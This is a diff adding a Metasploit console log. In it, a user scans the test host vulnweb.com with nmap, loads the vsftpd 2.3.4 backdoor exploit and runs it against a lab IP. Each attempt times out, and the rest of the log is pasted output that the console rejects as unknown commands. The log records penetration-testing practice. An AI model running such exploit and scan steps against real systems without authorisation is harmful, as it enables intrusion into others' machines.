@@ -723,3 +723,130 @@ msf6 > msfdb init
 
 [-] Error: /usr/bin/msfdb must be run as root
 msf6 > run
+
+   set RHOSTS www.example.test/24
+msf6 > db_nmap -sV vulnweb.com
+[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-07 05:58 EDT
+[*] Nmap: Nmap scan report for vulnweb.com (44.228.249.3)
+[*] Nmap: Host is up (0.0014s latency).
+[*] Nmap: rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+[*] Nmap: Not shown: 998 filtered tcp ports (no-response)
+[*] Nmap: PORT    STATE SERVICE    VERSION
+[*] Nmap: 80/tcp  open  http-proxy Squid http proxy 6.9
+[*] Nmap: 443/tcp open  https?
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 57.06 seconds
+msf6 > search vsftpd
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.102
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads
+
+Compatible Payloads
+===================
+
+   #  Name                       Disclosure Date  Rank    Check  Description
+   -  ----                       ---------------  ----    -----  -----------
+   0  payload/cmd/unix/interact  .                normal  No     Unix Command, Interact with Established Connection
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/reverse
+[-] The value specified for payload is not valid.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOSTS 192.168.56.101
+[!] Unknown datastore option: LHOSTS. Did you mean RHOSTS?
+LHOSTS => 192.168.56.101
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[-] 192.168.56.102:21 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (192.168.56.102:21) timed out.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/reverse
+[-] The value specified for payload is not valid.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOSTS 192.168.56.101
+LHOSTS => 192.168.56.101
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[-] 192.168.56.102:21 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (192.168.56.102:21) timed out.
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS www.example.test/24
+RHOSTS => www.example.test/24                                                                                                                                                                                                               
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > msf6 > db_nmap -sV vulnweb.com                                                                                                                                                                 
+[-] Unknown command: msf6. Run the help command for more details.                                                                                                                                                                           
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-07 05:58 EDT                                                                                                                   
+[-] Unknown command: [*]. Run the help command for more details.                                                                                                                                                                            
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: Nmap scan report for vulnweb.com (44.228.249.3)                                                                                                                                      
+[-] Unknown command: [*]. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: Host is up (0.0014s latency).
+[-] Unknown command: [*]. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: rDNS record for 44.228.249.3: ec2-44-228-249-3.us-west-2.compute.amazonaws.com
+[-] Unknown command: [*]. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: Not shown: 998 filtered tcp ports (no-response)
+[-] Unknown command: [*]. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: PORT    STATE SERVICE    VERSION
+[-] Unknown command: [*]. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: 80/tcp  open  http-proxy Squid http proxy 6.9
+[-] Unknown command: [*]. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: 443/tcp open  https?
+[-] Unknown command: [*]. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[-] Unknown command: [*]. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 57.06 seconds
+[-] Unknown command: [*]. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > msf6 > search vsftpd
+[-] Unknown command: msf6. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > Matching Modules
+[-] Unknown command: Matching. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > ================
+[-] Unknown command: ================. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) >    #  Name                                  Disclosure Date  Rank       Check  Description
+[-] Unknown command: #. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) >    -  ----                                  ---------------  ----       -----  -----------
+[-] Unknown command: -. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) >    0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+[-] Unknown command: 0. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) >    1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+[-] Unknown command: 1. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor
+[-] Unknown command: Interact. Run the help command for more details.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[-] Unknown command: msf6. Run the help command for more details.
+
